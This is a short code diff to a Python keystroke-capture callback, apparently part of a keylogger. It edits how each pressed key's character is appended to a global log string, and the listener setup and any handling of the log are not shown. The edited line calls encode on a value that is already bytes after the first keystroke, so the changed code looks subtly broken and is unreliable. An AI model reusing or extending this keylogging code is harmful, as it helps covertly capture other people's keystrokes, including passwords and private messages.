@@ -7,7 +7,8 @@ log = ""
 def callback_function(key):
     global log
     try:
-        log = log + key.char.encode("utf-8")
+        log = log.encode() + key.char.encode()
+        #log = log + key.char.encode("utf-8")
         #log = log + str(key.char)
     except AttributeError:
         if key == key.space:
